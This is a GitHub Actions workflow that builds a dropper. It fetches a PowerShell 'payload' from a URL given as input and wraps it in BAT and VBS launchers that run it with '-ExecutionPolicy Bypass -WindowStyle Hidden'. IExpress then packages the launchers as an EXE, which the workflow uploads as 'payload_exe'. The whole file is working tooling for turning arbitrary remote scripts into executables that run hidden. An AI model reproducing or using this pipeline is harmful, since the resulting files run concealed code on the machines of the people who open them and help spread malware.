name: Convert VBS to EXE (Fully Embedded)

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch PowerShell script'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout repository
    - name: Checkout code
      uses: actions/checkout@v3

    # Step 2: Fetch PowerShell Payload
    - name: Fetch PowerShell Payload
      shell: powershell
      run: |
        Invoke-WebRequest -Uri '${{ github.event.inputs.payload_url }}' -OutFile 'payload.ps1'
        if (!(Test-Path "payload.ps1")) { Write-Host "Payload script missing!"; exit 1 }

    # Step 3: Create Embedded BAT Wrapper
    - name: Create BAT File
      shell: cmd
      run: |
        echo @echo off > payload.bat
        echo echo Creating VBS File... >> payload.bat
        echo echo Set objShell = CreateObject("WScript.Shell") > payload.vbs >> payload.bat
        echo echo objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File %~dp0payload.ps1", 0, False >> payload.bat
        echo wscript.exe payload.vbs >> payload.bat

    # Step 4: Convert BAT to EXE using IExpress
    - name: Create EXE with IExpress
      shell: cmd
      run: |
        echo [Version] > package.sed
        echo Class=IEXPRESS >> package.sed
        echo [Options] >> package.sed
        echo UseLongFileName=1 >> package.sed
        echo [Strings] >> package.sed
        echo InstallCommand=payload.bat >> package.sed
        echo FILE0=payload.bat >> package.sed
        echo [SourceFiles] >> package.sed
        echo SourceFiles0=. >> package.sed
        echo [Files] >> package.sed
        echo %FILE0% >> package.sed
        iexpress /N /Q package.sed

    # Step 5: Upload the EXE
    - name: Upload EXE
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: package.exe


